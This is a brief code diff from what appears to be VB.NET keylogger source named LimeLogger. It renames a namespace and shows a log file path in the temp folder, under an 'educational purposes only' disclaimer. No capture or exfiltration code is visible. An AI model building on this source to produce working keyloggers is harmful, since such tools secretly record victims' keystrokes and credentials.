@@ -13,7 +13,7 @@ Imports System.Windows.Forms
 '   │-----------------------------------------------
 '   This program is distributed for educational purposes only.
 
-Namespace LimeLogger
+Namespace Other
     Module LimeLogger
         Private s As String = New IO.FileInfo(Application.ExecutablePath).Name
         Private ReadOnly loggerPath As String = IO.Path.GetTempPath & "\" & s & ".txt"
